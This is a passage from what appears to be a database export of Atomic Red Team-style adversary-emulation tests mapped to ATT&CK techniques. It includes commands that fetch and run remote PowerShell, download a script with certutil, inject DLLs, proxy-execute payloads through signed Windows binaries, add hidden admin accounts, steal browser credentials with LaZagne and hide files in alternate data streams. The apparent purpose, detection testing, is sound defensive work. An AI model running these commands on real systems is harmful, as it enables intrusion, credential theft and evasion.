\\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "mavinject - Inject DLL into running process", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_id", "value": "1000"}, {"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\x64\\\\T1218.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["SyncAppvPublishingServer.exe \\"n; #{powershell_code}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_code", "value": "Start-Process calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Register-CimProvider - Execute evil dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Win32\\\\T1218-2.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["InfDefaultInstall.exe #{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InfDefaultInstall.exe .inf Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Infdefaultinstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["FOR /F \\"tokens=2*\\" %a in ('reg query \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Winword.exe\\" /V PATH') do set microsoft_wordpath=%b\\ncall \\"%microsoft_wordpath%\\\\protocolhandler.exe\\" \\"ms-word:nft|u|#{remote_url}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ProtocolHandler.exe Downloaded a Suspicious File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"(Resolve-Path \\"C:\\\\Program Files*\\\\Microsoft Office\\\\root\\\\Office16\\")\\\\protocolhandler.exe\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "remote_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{mwcpath}\\\\#{mwcname} \\"#{xml_payload}\\" output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Microsoft.Workflow.Compiler.exe Payload Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mwcpath}\\\\#{mwcname} ) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{renamed_binary} #{xml_payload} output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Copy-Item #{mwcpath}\\\\#{mwcname} \\"#{renamed_binary}\\" -Force\\nif (Test-Path \\"#{renamed_binary}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "renamed_binary", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\svchost.exe"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "module_name", "value": "foo"}, {"key": "module_path", "value": "$PWD"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["control.exe #{cpl_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Control Panel Items", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "cpl_file_path", "value": "PathToAtomicsFolder\\\\T1218.002\\\\bin\\\\calc.cpl"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "CheckIfInstallable method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "CheckIfInstallable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallHelper method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "InstallHelper"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil class constructor method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Install_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Install method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /U `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - /U variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/? `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_HelpText_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil HelpText method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"$Env:windir\\\\System32\\\\Tasks\\"\\n$InstallerAssemblyFileName = 'readme.txt'\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"readme.txt\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\\nSet-Location \\"$Env:windir\\\\System32\\\\Tasks\\"\\n\\nCopy-Item -Path \\"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\\" -Destination \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = 'Executable'\\n    CommandLine = $CommandLine\\n    InstallUtilPath = \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil evasive invocation", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}], "execution_status": "Pass"}]}}}}
124	\N	\N	bat	yes	null	\N	2021-08-30 14:07:11.686665+00	T1047	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "NA", "command": ["wmic useraccount get /ALL /format:csv"], "executor": ["Cmd"], "platform": "Windows", "file_name": "", "pre_command": [], "ability_name": "WMI Reconnaissance Users", "created_date": "30/08/2021", "post_command": [], "modified_date": "30/08/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
50	\N		\N	yes	\N	\N	2021-07-02 09:47:20.488802+00	T1082	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Run below command.\\nagent_id> sysinfo"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.653Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
312	\N		\N	yes	P2	\N	2021-07-30 02:47:37.679063+00	T1055	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path 